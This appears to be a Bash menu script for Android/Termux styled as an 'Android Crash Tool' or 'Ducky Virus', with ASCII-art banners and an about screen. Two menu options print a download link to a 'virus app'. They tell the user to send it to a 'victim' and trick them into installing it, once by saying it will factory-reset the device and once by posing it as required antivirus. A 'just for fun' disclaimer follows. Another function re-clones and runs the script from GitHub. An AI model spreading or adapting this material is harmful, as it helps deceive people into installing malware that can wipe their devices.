red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
banner(){
echo -e '\e[93m               
                    ██████████                                  
                  ██░░░░░░░░░░██                                
                ██░░░░░░░░░░░░░░██                              
                ██░░░░░░░░████░░██████████                      
    ██          ██░░░░░░░░████░░██▒▒▒▒▒▒██                      
  ██░░██        ██░░░░░░░░░░░░░░██▒▒▒▒▒▒██                      
  ██░░░░██      ██░░░░░░░░░░░░░░████████                        
  ██░░░░░░██      ██░░░░░░░░░░░░██                              
██░░░░░░░░████████████░░░░░░░░██                                
██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░██                              
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                           
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                              
██░░░░░░░░░░░░░░░░░░░░░░░░░░██                                
  ██████░░░░░░░░░░░░░░░░████                                  
        ████████████████                                      

'
echo " " 
echo -e "$red #$pink krishealty$grn $red#$rset"
echo 
# Functions
echo -e "$red #$pink[Android Crash Tool] $red#$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[93m               
                    ██████████
                  ██░░░░░░░░░░██
                ██░░░░░░░░░░░░░░██
                ██░░░░░░░░████░░██████████
    ██          ██░░░░░░░░████░░██▒▒▒▒▒▒██
  ██░░██        ██░░░░░░░░░░░░░░██▒▒▒▒▒▒██
  ██░░░░██      ██░░░░░░░░░░░░░░████████
  ██░░░░░░██      ██░░░░░░░░░░░░██
██░░░░░░░░████████████░░░░░░░░██
██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░██
  ██████░░░░░░░░░░░░░░░░████
        ████████████████
'
echo " "
echo -e "$red #$pink krishealty$grn $red#$rset"
echo
# Functions
echo -e "$red #$pink[Android Crash Tool] $red#$rset"
echo " "
echo " "
}
menu(){
echo -e "$red #$ylo [Choose Option] $red #$rset"
echo " "
echo " "
echo -e "$red #$cyan [\e[93m1\e[96m] Ducky Virus 1"
echo -e "$red #$cyan [\e[93m2\e[96m] Ducky Virus 2"
echo -e "$red #$cyan [\e[93m3\e[96m] About"
echo -e "$red #$cyan [\e[93m4\e[96m] Join Us"
echo -e "$red #$cyan [\e[93m5\e[96m] Exit"
echo " "
echo " "
echo -e "$red #$ylo [Select] $red #$rset"
echo " "
echo -ne "\e[92m#SELECT OPTION\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
elif [ $optnz = "4" ];
then
am start -a android.intent.action.VIEW -d https:krish.l5.ca > /dev/null 2>&1
banner
menu
elif [ $optnz = "5" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 
   DUCKY VIRUS!                         
'

echo " "
echo -e "\e[91m 😈  Copy below link and paste in any browser and download virus app and send  to ur victim and just say install it 
device it will be factory reset and lot more happens.
                                👇👇👇

         \e[92mL1NK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[91m

                                 👆👆👆
Use only for fun purpose not for harming someone 😇✌️.
And we are not responsible for any missuse or illegal activites. 
you do to other's by this script."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
   DUCKY VIRUS!
'

echo " "
echo " "
echo -e "\e[91m 😈  Copy below link and paste in any browser and download virus app and send to  ur victim and just say install it
that he should install this application or else his 
device will not be recovered.(Antivirus)
                    👇👇👇

        \e[92mL1NK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[93m

                    👆👆👆
Use only for fun purpose not for harming someone 😇✌️. 
And we are not responsible for any missuse or illegal activites.
you do to other's by this script."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
   ||  ||  
    \\()// 
  //(__)\\
  ||    ||
'
echo -e "\e[93m             ADMIN OF \e[92mkrishealty" | pv -qL 10
echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
echo -e "\e[93m         Keep Supporting And Join Us " | pv -qL 10
echo -e "\e[93m         Join Us:\e[92m https://krish.l5.ca[0m" | pv -qL 10
sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/ducky-virus" ];
then
cd $HOME
rm -rf ducky-virus
elif [ -d "$HOME/ducky-virus" ];
then
cd $HOME
rm -rf ducky-virus
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATING, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/krishealty/ducky-virus 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd ducky-virus
bash ducky-virus.sh
}
banner
menu
